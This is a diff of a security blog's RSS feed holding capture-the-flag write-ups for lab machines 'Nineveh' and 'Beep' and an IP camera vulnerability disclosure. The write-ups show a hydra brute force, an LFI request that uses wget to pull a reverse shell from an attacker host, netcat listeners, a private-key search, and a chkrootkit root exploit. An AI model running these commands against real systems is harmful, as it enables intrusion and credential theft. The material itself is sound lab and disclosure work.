@@ -5,15 +5,15 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 06 Feb 2018 18:43:08 +0100</pubDate>
-    <lastBuildDate>Tue, 06 Feb 2018 18:43:08 +0100</lastBuildDate>
-    <generator>Jekyll v3.6.2</generator>
+    <pubDate>Sun, 05 Apr 2020 23:08:30 +0200</pubDate>
+    <lastBuildDate>Sun, 05 Apr 2020 23:08:30 +0200</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
     
       <item>
         <title>Nineveh Writeup</title>
         <description>&lt;p&gt;Let’s start with NMAP:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV 10.10.10.43 -p 1-65535 -A
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV 10.10.10.43 -p 1-65535 -A
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-06 04:37 EST
 Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
@@ -49,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 292.82 seconds
 
 &lt;p&gt;After enumerated HTTP and HTTP I found:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# dirsearch.py --url http://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# dirsearch.py --url http://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -87,24 +87,24 @@ Task Completed
 
 &lt;p&gt;There was phpLiteAdmin v1.9 on https://nineveh.htb/db/index.php:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-02-05-htb-nineveh/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-02-05-htb-nineveh/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I tried to bruteforce the login with hydra:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l '' -P rockyou.txt nineveh.htb https-post-form &quot;/db/index.php:password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password.&quot;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l '' -P rockyou.txt nineveh.htb https-post-form &quot;/db/index.php:password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password.&quot;
 [443][http-post-form] host: nineveh.htb   password: password123
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;I found &lt;a href=&quot;https://www.exploit-db.com/exploits/24044/&quot;&gt;this&lt;/a&gt; vulnerability but it didn’t work because the path of the saved db (/var/tmp/syrion.php) was not in the directories of the web server. I tried to move the db in /var/www/, /var/www/html and /var/www/ssl but I got this error:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: copy(/var/www/html/syrion.php): failed to open stream: Permission denied in /var/www/ssl/db/index.php on line 1259
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: copy(/var/www/html/syrion.php): failed to open stream: Permission denied in /var/www/ssl/db/index.php on line 1259
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;So the application didn’t have the permissions for write there.&lt;/p&gt;
 
 &lt;p&gt;At this point I tried to bruteforce the login in http://nineveh.htb/department :&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-02-05-htb-nineveh/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-02-05-htb-nineveh/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;The credentials were admin:1q2w3e4r5t.&lt;/p&gt;
 
@@ -113,24 +113,24 @@ I tried to include my db /var/tmp/syrion.php (but it didn’t work.&lt;/p&gt;
 
 &lt;p&gt;By rename the db ninevehNotes1.php I was able to incude my shell and execute command:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-02-05-htb-nineveh/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-02-05-htb-nineveh/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;In the source code of the page there was this check:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!strpos($file, &quot;ninevehNotes&quot;))
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!strpos($file, &quot;ninevehNotes&quot;))
     exit(&quot;No Note is selected.&quot;);
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;I uploaded a reverse shell with wget and then include it:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes1.php&amp;amp;cmd=wget%20http://10.10.14.6:8000/syrion%20-O%20/var/tmp/ninevehNotes2.php
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes1.php&amp;amp;cmd=wget%20http://10.10.14.6:8000/syrion%20-O%20/var/tmp/ninevehNotes2.php
 
 http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes2.php
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;And I got a reverse shell:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nc -lvp 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 50710
 Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
@@ -146,7 +146,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 &lt;p&gt;From the sshd_config file we knew that the user could access ssh with a private key, so I start to enumerate the sistem in order to find this key:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc/ssh$ find / -xdev -type f -print0 | xargs -0 grep -H &quot;BEGIN RSA PRIVATE KEY&quot;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc/ssh$ find / -xdev -type f -print0 | xargs -0 grep -H &quot;BEGIN RSA PRIVATE KEY&quot;
 &amp;lt;find / -xdev -type f -print0 | xargs -0 grep -H &quot;BEGIN RSA PRIVATE KEY&quot;     
 
 Binary file /var/www/ssl/secure_notes/nineveh.png matches
@@ -154,7 +154,7 @@ Binary file /var/www/ssl/secure_notes/nineveh.png matches
 
 &lt;p&gt;Mmm was the private key hidden in the png?&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop# binwalk -e  nineveh.png 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop# binwalk -e  nineveh.png 
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -173,7 +173,7 @@ nineveh.priv  nineveh.pub
 
 &lt;p&gt;Ok I got the private key, but there was no ssh in the nmap scan. After a bit of enumeration I found this configuration file:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc$ cat knockd.conf
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc$ cat knockd.conf
 cat knockd.conf
 [options]
  logfile = /var/log/knockd.log
@@ -194,12 +194,12 @@ cat knockd.conf
 
 &lt;p&gt;I needed to send the knock sequence to open the ssh port, I did it with nmap:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for x in 571 290 911 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for x in 571 290 911 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;At this point I was the user amrois:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv 
 Ubuntu 16.04.2 LTS
 Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 
@@ -220,7 +220,7 @@ amrois@nineveh:~$
 
 &lt;p&gt;There was an insteresting file in the crontab:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ crontab -l
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ crontab -l
 # Edit this file to introduce tasks to be run by cron.
 # 
 # Each task to run has to be defined through a single line
@@ -246,13 +246,13 @@ amrois@nineveh:~$
 */10 * * * * /usr/sbin/report-reset.sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
 #!/bin/bash
 
 rm -rf /report/*.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ ls -lah /report/
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ ls -lah /report/
 total 64K
 drwxr-xr-x  2 amrois amrois 4.0K Feb  6 11:06 .
 drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
@@ -267,7 +267,7 @@ drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
 
 &lt;p&gt;After a research on google I discovered that the reports were generated by chkrootkit. Because of crontab, I supposed it was vulnerable to &lt;a href=&quot;https://www.exploit-db.com/exploits/33899/&quot;&gt;this&lt;/a&gt; exploit. As described I created a file in /tmp that execute a python reverse shell called update and I got it:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nc -vlp 5555
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nc -vlp 5555
 listening on [any] 5555 ...
 connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 60862
 /bin/sh: 0: can't access tty; job control turned off
@@ -292,11 +292,11 @@ uid=0(root) gid=0(root) groups=0(root)
         <title>Master IP CAM 01 Vulnerabilities</title>
         <description>&lt;p&gt;Some time ago I analized this ipcam with my friend &lt;a href=&quot;https://twitter.com/dzonerzy&quot;&gt;Dzonerzy&lt;/a&gt;:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img1.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img1.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img2.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img2.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var serialNum=&quot;VVVIPCSBC150617Z-06929VjmJH54vkK&quot;;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var serialNum=&quot;VVVIPCSBC150617Z-06929VjmJH54vkK&quot;;
 var model=&quot;RT_IPC&quot;;
 var hardVersion=&quot;5900-gc1004&quot;;
 var softVersion=&quot;V3.3.4.2103-S50-SBC-B20150721E&quot;;
@@ -331,7 +331,7 @@ var mppver=&quot;mpp&quot;;
 
 &lt;p&gt;First of all we ran nmap:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Stone:~ syrion$ nmap 192.168.1.124 -sV -sT -p 1-65535
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Stone:~ syrion$ nmap 192.168.1.124 -sV -sT -p 1-65535
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-23 17:41 CET
 Nmap scan report for 192.168.1.124
@@ -356,7 +356,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.44 seconds
 
 &lt;p&gt;There was a login page where we could login with admin:admin&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Obviously every request was in HTTP (LOL).&lt;/p&gt;
 
@@ -366,59 +366,59 @@ Nmap done: 1 IP address (1 host up) scanned in 51.44 seconds
 
 &lt;p&gt;We could download the configuration file:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;The first step was uncompressing the config_backup.bin file:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Stone:Desktop syrion$ tar xvf config_backup.bin 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Stone:Desktop syrion$ tar xvf config_backup.bin 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;There were a lot of configuration files. But let’s look at the webserver.conf:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port=80 user=root cgipat=cgi-bin/** nosymlink globalpasswd debug cgilimit=30
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port=80 user=root cgipat=cgi-bin/** nosymlink globalpasswd debug cgilimit=30
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;From nmap we knew the webserver was thttpd 2.25b 29dec2003, so after read the &lt;a href=&quot;https://acme.com/software/thttpd/thttpd_man.html&quot;&gt;manual&lt;/a&gt; we discovered how to change the root directory of the webserver, so we modified the configuration file as follow:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port=80 user=root dir=/etc/ nosymlink globalpasswd debug cgilimit=30
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port=80 user=root dir=/etc/ nosymlink globalpasswd debug cgilimit=30
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Ok at this point we only needed something to upload the new configuration file. The &lt;a href=&quot;http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf&quot;&gt;manual&lt;/a&gt; helped us again:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It worked and after some minutes the ipcamera was online again:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img9.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img9.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;cve-2018-5723-hardcoded-password-for-root-account&quot;&gt;[CVE-2018-5723] Hardcoded Password for Root Account&lt;/h2&gt;
 
 &lt;p&gt;Good, we got the passwd file with the password hash for user root:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:$1$xFoO/s3I$zRQPwLG2yX1biU31a2wxN/:0:0::/root:/bin/sh
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:$1$xFoO/s3I$zRQPwLG2yX1biU31a2wxN/:0:0::/root:/bin/sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;With John we cracked it:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img10.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img10.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;And yes, we got root:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img11.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img11.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;cve-2018-5725-unauthenticated-configuration-change&quot;&gt;[CVE-2018-5725] Unauthenticated Configuration Change&lt;/h2&gt;
 
 &lt;p&gt;Without any authentication we could change the port where the server was running:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;
-&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;
-&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;
+&lt;img src=&quot;/images/2018-01-15-master-ipcam/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;
+&lt;img src=&quot;/images/2018-01-15-master-ipcam/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;cve-2018-5726-unauthenticated-sensitive-information-disclousure&quot;&gt;[CVE-2018-5726] Unauthenticated Sensitive Information Disclousure&lt;/h2&gt;
 
 &lt;p&gt;That was so magic:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-15-master-ipcam/img12.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img12.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
 
@@ -450,7 +450,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.44 seconds
 
 &lt;p&gt;Let’s run nmap to see which services are running on the machine:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-08 12:27 EST
 Nmap scan report for beep.localdomain (10.10.10.7)
@@ -480,11 +480,11 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: U
 
 &lt;p&gt;On port 443 there was Apache with elastix:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;By using dirsearch I enumerated it’s directories:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -515,20 +515,20 @@ Target: https://10.10.10.7/
 
 &lt;p&gt;I found vtigercrm 5.1.0:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This version is vulnerable to LFI.
 With &lt;a href=&quot;https://github.com/dzonerzy/goWAPT&quot;&gt;goWAPT&lt;/a&gt; I enumerated all the files:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;In the /etc/passwd file we can see the user Fanis:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;After some research on google about asterisk, I got the etc/asterisk/manager.conf file:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;
 ; AMI - Asterisk Manager interface
 ;
 ; FreePBX needs this to be enabled. Note that if you enable it on a different IP, you need
@@ -560,11 +560,11 @@ write = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting
 
 &lt;p&gt;After some research on Google, I was able to upload a backdoor by using this &lt;a href=&quot;https://www.exploit-db.com/exploits/38345/&quot;&gt;vulnerability&lt;/a&gt; in vtiger crm:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2018/2018-01-08-htb-beep/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;With python I got a reverse shell and the user flag:&lt;/p&gt;
 
